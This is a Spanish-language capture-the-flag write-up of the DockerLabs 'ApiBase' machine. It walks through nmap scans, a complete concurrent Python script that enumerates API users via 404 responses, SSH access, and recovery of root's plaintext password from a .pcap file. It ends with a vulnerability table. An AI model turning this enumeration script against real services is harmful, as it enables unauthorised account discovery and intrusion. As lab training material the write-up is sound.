@@ -1,0 +1,263 @@
+---
+title: ApiBase
+description: Resolución completa de la máquina virtual *ApiBase* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **ApiBase**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone una API REST en el puerto 5000 que permite la enumeración de usuarios mediante el endpoint `/users`, el cual devuelve diferentes códigos de estado según la existencia del usuario. Tras desarrollar un script para automatizar la enumeración, se identifica al usuario `Pingu` como válido.
+Con las credenciales obtenidas, se accede al sistema vía SSH. Una vez dentro, se encuentra un archivo de captura de red (`.pcap`) que contiene credenciales en texto plano del usuario `root`, permitiendo el acceso directo al sistema como administrador sin necesidad de técnicas de escalada adicionales.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'ApiBase',
+    Autor: 'El Pingüino de Mario',
+    Dificultad: 'Fácil',
+    Fecha: '27/02/2025',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip ApiBase.zip
+sudo bash auto_deploy.sh ApiBase.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p ApiBase/{content,exploits,nmap,scripts}
+cd ApiBase
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **5000/tcp** — HTTP (API)
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1760685817/Ports_zrrv2q.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,5000 172.17.0.2 -oN targeted
+```
+
+---
+
+### 1.3 Enumeración de la API
+
+Se accede al servicio en `http://172.17.0.2:5000`. La API ofrece los siguientes endpoints:
+
+* `POST /add` — Permite agregar usuarios.
+* `GET /users?username=<usuario>` — Lista información del usuario por `username`.
+
+![Web API](https://res.cloudinary.com/dewqswzke/image/upload/v1760685816/Index_yilxcp.png)
+
+Se confirma que `GET /users?username=...` devuelve información si el usuario existe y código `404` si no existe. Esta diferencia permite enumerar usuarios mediante fuerza bruta.
+
+![Bruno add](https://res.cloudinary.com/dewqswzke/image/upload/v1760685816/AddUser_uqiwsj.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Automatización de enumeración de usuarios
+
+Se desarrolla un script en Python para automatizar la enumeración de usuarios mediante peticiones concurrentes al endpoint `/users`:
+
+```python
+# enum_users_fast.py
+import http.client
+from urllib.parse import quote_plus
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+import argparse
+
+HOST = "172.17.0.2"
+PORT = 5000
+ENDPOINT = "/users"
+BODY_PREVIEW = 200
+
+def check_user(host, port, endpoint, username, timeout=8, retries=1):
+    username_q = quote_plus(username)
+    path = f"{endpoint}?username={username_q}"
+    for attempt in range(retries + 1):
+        conn = http.client.HTTPConnection(f"{host}:{port}", timeout=timeout)
+        try:
+            conn.request("GET", path)
+            res = conn.getresponse()
+            body = res.read().decode("utf-8", errors="replace")
+            return username, res.status, body
+        except Exception as e:
+            last_exc = e
+        finally:
+            try:
+                conn.close()
+            except:
+                pass
+    return username, None, f"Error: {last_exc}"
+
+def main(args):
+    with open(args.input_file, "r", encoding=args.encoding, errors="ignore") as f:
+        users = [line.strip() for line in f if line.strip()]
+
+    print(f"[*] Cargando {len(users)} usuarios desde {args.input_file}...")
+    total = 0
+    useful = 0
+    start = time.time()
+
+    with ThreadPoolExecutor(max_workers=args.max_workers) as executor:
+        futures = {executor.submit(check_user, HOST, PORT, ENDPOINT, u, args.timeout, args.retries): u for u in users}
+
+        for future in as_completed(futures):
+            total += 1
+            username, status, body = future.result()
+
+            if status is not None and status != 404:
+                useful += 1
+                preview = body[:BODY_PREVIEW] + ("..." if len(body) > BODY_PREVIEW else "")
+                print(f"[ÚTIL] {username} -> {status}")
+                print(preview)
+                print("-" * 60)
+
+            if total % 100 == 0:
+                elapsed = time.time() - start
+                print(f"[+] Progreso: {total}/{len(users)} (tiempo: {elapsed:.1f}s)")
+
+    elapsed = time.time() - start
+    print(f"\nResumen: probados = {total}, útiles (no-404) = {useful}, tiempo = {elapsed:.2f}s")
+
+if __name__ == "__main__":
+    p = argparse.ArgumentParser(description="Enumera usuarios via /users?username= on ApiBase")
+    p.add_argument("--input-file", default="/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt")
+    p.add_argument("--max-workers", type=int, default=20)
+    p.add_argument("--timeout", type=int, default=8)
+    p.add_argument("--retries", type=int, default=1)
+    p.add_argument("--encoding", default="latin-1")
+    args = p.parse_args()
+    main(args)
+```
+
+Se ejecuta el script:
+
+```bash
+python3 enum_users_fast.py
+```
+
+![Resultado script](https://res.cloudinary.com/dewqswzke/image/upload/v1760685817/Pingu_h4cdi0.png)
+
+Se identifica al usuario `Pingu` como válido.
+
+### 2.2 Acceso SSH
+
+Con el usuario identificado, se intenta autenticación por SSH. Se obtiene acceso al sistema:
+
+```bash
+ssh Pingu@172.17.0.2
+```
+
+![SSH logrado](https://res.cloudinary.com/dewqswzke/image/upload/v1760685819/Ssh_tozddl.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De Pingu → root
+
+Una vez dentro como `Pingu`, se realiza una enumeración básica del sistema:
+
+- `sudo -l` no está disponible.
+- No se encuentran binarios con bit SUID evidentes.
+- Se busca archivos interesantes: scripts, copias de seguridad, capturas de red.
+
+Se identifica un archivo `.pcap` (captura de tráfico) accesible por el usuario.
+
+![Ls](https://res.cloudinary.com/dewqswzke/image/upload/v1760687659/Ls_k8z0dc.png)
+
+La apertura del `.pcap` con Wireshark/tshark revela credenciales en texto plano dentro de la captura.
+
+![Pcap](https://res.cloudinary.com/dewqswzke/image/upload/v1760685819/Wireshark_gjkczf.png)
+
+En la captura aparece una contraseña usable para la cuenta `root`. Con esa contraseña se inicia sesión como root:
+
+```bash
+su root
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1760685818/Root_fufstf.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Diferencia de códigos de estado en endpoint de API",
+      severity: "Media",
+      impact: "Enumeración de usuarios válidos del sistema"
+    },
+    {
+      vulnerability: "Falta de rate limiting en la API",
+      severity: "Media",
+      impact: "Ataques de fuerza bruta ilimitados"
+    },
+    {
+      vulnerability: "Exposición de credenciales en texto plano en captura de red",
+      severity: "Crítica",
+      impact: "Compromiso de cuenta privilegiada root"
+    },
+    {
+      vulnerability: "Almacenamiento inseguro de archivos .pcap en directorio accesible",
+      severity: "Alta",
+      impact: "Exposición de información sensible"
+    },
+    {
+      vulnerability: "Uso de contraseñas débiles para root",
+      severity: "Crítica",
+      impact: "Acceso no autorizado al sistema"
+    }
+  ]}
+/>
